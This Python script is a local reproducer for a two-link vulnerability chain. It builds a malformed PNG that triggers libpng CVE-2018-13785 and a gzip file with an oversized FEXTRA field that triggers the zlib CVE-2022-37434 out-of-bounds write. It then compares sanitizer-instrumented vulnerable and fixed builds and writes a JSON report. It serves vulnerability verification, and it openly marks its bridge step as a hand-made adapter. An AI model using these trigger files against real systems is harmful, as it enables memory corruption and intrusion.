#!/usr/bin/env python3
"""End-to-end local chain fixture: CVE-2018-13785 (libpng) + histogram->FEXTRA
bridge + CVE-2022-37434 (zlib) 4 GiB OOB write.

Produces ONE artifact set and runs the vulnerable/fixed differential for each
link. Local disposable fixtures only; no device delivery.

Chain (local, verified links):
  H1  libpng CVE-2018-13785: huge-width RGB8 PNG -> row_factor integer
      overflow -> division-by-zero FPE at pngrutil.c:3154 (1.6.34 only,
      under a test-only raised width cap). Fixed 1.6.35 rejects cleanly.
  BRIDGE  PNG zero-sample histogram is serialized (struct.pack "<III") into a
      gzip FEXTRA header (the "ZS" subfield). This adapter is local test code
      (fextra_carrier.py); it is NOT demonstrated iOS/STExtractionService code.
  H2  zlib CVE-2022-37434: gzip FEXTRA with XLEN > consumer extra_max ->
      `extra_max - len` unsigned underflow -> zmemcpy of 0xFFFFFFFF bytes to
      `extra + len` (OOB) at inflate.c:769. 4 GiB OOB write. Fixed 1.2.13
      guards `len < extra_max` and completes cleanly.

Honesty boundary: the histogram->FEXTRA bridge is a hand-crafted adapter. The
4 GiB write is caused by XLEN > extra_max (the length mismatch), NOT by the
histogram being large; the histogram is payload content inside FEXTRA.
"""
import os, struct, subprocess, zlib, binascii, hashlib, json, sys

ROOT = "/home/box/Desktop/Juicy/SeraProjs"
OUT  = os.path.join(ROOT, "reproducer-package", "chain-artifacts")
os.makedirs(OUT, exist_ok=True)

LIBPNG_VULN = os.path.join(ROOT, "libpng-read-asan-1.6.34-unlimited")
LIBPNG_FIX  = os.path.join(ROOT, "libpng-read-asan-1.6.35-unlimited")
ZLIB_VULN   = os.path.join(ROOT, "zlib-chain", "driver-asan-vuln")
ZLIB_FIX    = os.path.join(ROOT, "zlib-chain", "driver-asan-fixed")
WRITE_PROOF = os.path.join(ROOT, "zlib-chain", "write_proof_driver")

def sha256(b): return hashlib.sha256(b).hexdigest()

def chunk(t, d):
    return struct.pack(">I", len(d)) + t + d + struct.pack(">I", binascii.crc32(t + d) & 0xffffffff)

SIG = b"\x89PNG\r\n\x1a\n"

# ---- H1: CVE-2018-13785 trigger geometry (huge width, RGB8, short zero IDAT) ----
W, H = 1431655765, 1
ihdr = struct.pack(">IIBBBBB", W, H, 8, 2, 0, 0, 0)   # 8-bit RGB
idat_raw = bytes(32)                                    # inflates to 32 zero bytes
fpe_png = SIG + chunk(b"IHDR", ihdr) + chunk(b"IDAT", zlib.compress(idat_raw)) + chunk(b"IEND", b"")
fpe_path = os.path.join(OUT, "h1-cve-2018-13785-trigger.png")
open(fpe_path, "wb").write(fpe_png)

# ---- A valid, decodable large all-zero raster -> genuine large zero histogram ----
# Bounded so it is a real decodable image (not the FPE geometry).
VW, VH = 100000, 1                                     # 100000 x 1 RGB8
vraw = b"\x00" + bytes(VW * 3 * VH)                    # filter byte 0 + 300000 zero samples
valid_png = SIG + chunk(b"IHDR", struct.pack(">IIBBBBB", VW, VH, 8, 2, 0, 0, 0)) \
            + chunk(b"IDAT", zlib.compress(vraw)) + chunk(b"IEND", b"")
valid_path = os.path.join(OUT, "bridge-valid-100000x1-allzero.png")
open(valid_path, "wb").write(valid_png)
zero_count = vraw.count(0) - 1                         # 300000 zero samples (exclude filter byte)
total = VW * 3 * VH                                    # 300000

# ---- BRIDGE: serialize the zero-sample histogram into a gzip FEXTRA header ----
# struct.pack("<III", zeros, total, distinct)  -> the histogram is cast into FEXTRA
payload = struct.pack("<III", zero_count, total, 1)
sub = b"ZS" + struct.pack("<H", len(payload)) + payload
if len(sub) & 1: sub += b"\x00"
extra = sub
xlen = len(extra)
co = zlib.compressobj(9, zlib.DEFLATED, -15)
body = co.compress(valid_png) + co.flush()
gz = (b"\x1f\x8b\x08\x04" + bytes(4) + b"\x00\xff"
      + struct.pack("<H", xlen) + extra + body
      + struct.pack("<II", binascii.crc32(valid_png) & 0xffffffff, len(valid_png) & 0xffffffff))
gz_path = os.path.join(OUT, "bridge-histogram-fextra-carrier.png.gz")
open(gz_path, "wb").write(gz)

# ---- run helpers ----
def run_png(exe, data):
    env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0",
               UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:handle_divide_by_zero=0")
    q = subprocess.run([exe], input=data, capture_output=True, env=env, timeout=60)
    s = (q.stdout + q.stderr).decode(errors="replace")
    if "division by zero" in s or "FPE" in s: st = "FPE(div-by-zero)"
    elif "Not enough image data" in s: st = "rejected(Not enough image data)"
    elif "AddressSanitizer" in s: st = "ASAN"
    else: st = "clean"
    return st, q.returncode

def run_zlib(exe, path, cap=8):
    env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0")
    q = subprocess.run([exe, path, str(cap)], capture_output=True, env=env, timeout=60)
    s = (q.stdout + q.stderr).decode(errors="replace")
    asan = "AddressSanitizer" in s
    size = None
    for line in s.splitlines():
        if "of size" in line and ("READ" in line or "WRITE" in line):
            size = line.strip(); break
    final = next((l.strip() for l in s.splitlines() if "inflate_final=" in l), None)
    return asan, size, final, q.returncode

def run_writeproof(path, cap=8):
    q = subprocess.run([WRITE_PROOF, path, str(cap)], capture_output=True, timeout=60)
    return q.stderr.decode(errors="replace"), q.returncode

report = {"artifacts": {}, "links": {}}

# ---- H1 differential (libpng) ----
v_st, v_rc = run_png(LIBPNG_VULN, fpe_png)
f_st, f_rc = run_png(LIBPNG_FIX,  fpe_png)
report["links"]["H1_libpng_CVE-2018-13785"] = {
    "input": "h1-cve-2018-13785-trigger.png (IHDR %dx%d RGB8, IDAT->32 zero bytes)" % (W, H),
    "vulnerable_1.6.34": v_st, "fixed_1.6.35": f_st,
    "differential": (v_st.startswith("FPE") and f_st.startswith("rejected")),
    "site": "pngrutil.c:3154 png_check_chunk_length (row_factor integer overflow -> div-by-zero)",
}

# ---- BRIDGE artifact facts ----
report["links"]["BRIDGE_histogram_to_FEXTRA"] = {
    "source_png": "bridge-valid-100000x1-allzero.png (decodable, 300000 zero samples)",
    "histogram": {"zero_count": zero_count, "total": total, "distinct": 1},
    "encoding": 'struct.pack("<III", zeros, total, distinct) into gzip FEXTRA "ZS" subfield',
    "gzip": "bridge-histogram-fextra-carrier.png.gz",
    "FLG": 0x04, "XLEN": xlen,
    "FEXTRA_hex": extra.hex(),
    "note": "Local adapter (fextra_carrier.py). NOT demonstrated iOS code.",
}

# ---- H2 differential (zlib) on the histogram carrier ----
va, vs, vf, vrc = run_zlib(ZLIB_VULN, gz_path, 8)
fa, fs, ff, frc = run_zlib(ZLIB_FIX,  gz_path, 8)
report["links"]["H2_zlib_CVE-2022-37434_on_histogram_carrier"] = {
    "input": "bridge-histogram-fextra-carrier.png.gz (XLEN=%d) extra_max=8" % xlen,
    "vulnerable_1.2.12": {"asan": va, "access": vs, "rc": vrc},
    "fixed_1.2.13": {"asan": fa, "final": ff, "rc": frc},
    "differential": (va and not fa),
    "site": "inflate.c:769 zmemcpy(extra+len, next, extra_max-len)",
}

# ---- 4 GiB OOB WRITE proof (instrumented) ----
wp_vuln, _ = run_writeproof(gz_path, 8)
wp_fix,  _ = run_writeproof(gz_path, 64)   # control: capacity >= XLEN
report["links"]["H2_4GiB_OOB_WRITE_proof"] = {
    "extra_max=8 (XLEN=16 > 8)": wp_vuln.strip().splitlines()[-1] if wp_vuln else "",
    "underflow_line": [l for l in wp_vuln.splitlines() if "ncopy" in l],
    "control_extra_max=64 (>=XLEN)": "no underflow" if "no underflow" in wp_fix else wp_fix,
}

# ---- artifact hashes ----
for name, p in [("h1_trigger_png", fpe_path), ("bridge_valid_png", valid_path), ("bridge_gzip", gz_path)]:
    report["artifacts"][name] = {"path": p, "sha256": sha256(open(p, "rb").read()),
                                 "bytes": os.path.getsize(p)}

print(json.dumps(report, indent=2))

# save
rep_path = os.path.join(OUT, "CHAIN-REPORT.json")
open(rep_path, "w").write(json.dumps(report, indent=2))
print("\nreport written:", rep_path, file=sys.stderr)
